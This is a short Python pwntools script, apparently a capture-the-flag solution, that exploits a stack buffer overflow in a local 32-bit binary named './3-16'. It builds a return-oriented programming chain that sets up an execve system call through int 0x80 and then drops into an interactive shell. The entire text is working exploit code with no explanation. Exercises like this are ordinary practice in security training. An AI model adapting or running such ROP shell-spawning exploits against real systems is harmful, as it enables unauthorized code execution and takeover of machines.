from pwn import *
p=process("./3-16")
bash=0x80aa490
offset =116
pop_edx_ecx_ebx_ret=0x08071040;
pop_eax_ret=0x08074c94;
int80=0x0806ea96
inc_eax_pop_eax_ret=0x080a70c5
pop_esi_ret=0x08049954
hope109=0x08090355
start=0xffffd1c8-0x5f
payload=p32(0x10000)+"y"*(offset-4)+p32(pop_eax_ret)+p32(11)+p32(pop_edx_ecx_ebx_ret)+p32(0)+p32(0)+p32(0x0809a490)+p32(pop_esi_ret)+p32(start)+p32(hope109)+p32(int80)+p32(0xdeadbeef)
p.sendline(payload)
p.interactive()